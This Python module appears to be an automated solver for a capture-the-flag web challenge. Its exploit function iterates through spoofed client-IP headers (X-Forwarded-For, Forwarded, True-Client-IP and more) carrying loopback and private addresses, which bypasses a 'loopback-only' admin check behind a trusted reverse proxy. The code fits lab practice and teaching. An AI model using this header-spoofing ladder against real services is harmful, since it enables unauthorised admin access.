"""D27 "Forwarded Misgivings" (web-exploitation-day-23-forwarded-misgivings): trusted client-IP header spoofing.

Kit shape: /api/clues = {framework, feature_route, current_role, deployment: "trusted_reverse_proxy"}; GET feature
-> 403 {"error":"loopback_only","evaluated_client":"10.x"}; same GET with `X-Forwarded-For: 127.0.0.1` ->
{"ok":true,"effect":"proxy_trust_admin_bypass","evaluated_client":"127.0.0.1","evidence":"proof_..."}.
Re-runnable. Ladder of proxy headers x client values in case a variant trusts another header / range.
"""
import json
import re

from lib import websolve

KEY_MAP = [(r"^deployment$", "day27_web_forwarded_misgivings")]

HEADERS = ("X-Forwarded-For", "X-Real-IP", "Forwarded", "X-Client-IP", "True-Client-IP", "X-Original-Forwarded-For",
           "X-Forwarded-Host", "X-Remote-Addr", "X-Originating-IP", "Client-IP", "X-Cluster-Client-IP")
VALUES = ("127.0.0.1", "::1", "localhost", "10.0.0.1", "192.168.0.1", "172.16.0.1")


def _json(body):
    try:
        j = json.loads(body or "")
        return j if isinstance(j, dict) else {}
    except ValueError:
        return {}


def _hv(name, value):
    if name.lower() == "forwarded":
        return "for=" + ('"[%s]"' % value if ":" in value else value)
    return value


def exploit(base, clues):
    base = base.rstrip("/")
    feat = clues.get("feature_route") or ""
    if not feat.startswith("/"):
        return None
    url = base + feat
    st, body, _ = websolve.fetch(url, timeout=8)
    p = websolve.proof(body)
    if p:
        return p
    err = _json(body)
    hint = " ".join(str(v) for v in err.values()).lower()
    headers = list(HEADERS)
    m = re.search(r"\b(x-[a-z0-9-]+|forwarded|true-client-ip|client-ip)\b", hint)
    if m:
        headers.insert(0, m.group(1))
    values = list(VALUES)
    if "private" in hint or "internal" in hint or "intranet" in hint:
        values = ["10.0.0.1", "192.168.0.1", "172.16.0.1", "127.0.0.1"] + values
    for v in values:
        for h in headers:
            st, body, _ = websolve.fetch(url, headers={h: _hv(h, v)}, timeout=8)
            p = websolve.proof(body)
            if p:
                return p
            if st == 0:
                continue
        if v == "::1":
            break  # loopback forms exhausted; private ranges only when the error hints them
    return None


HANDLERS = {"day27_web_forwarded_misgivings": exploit}
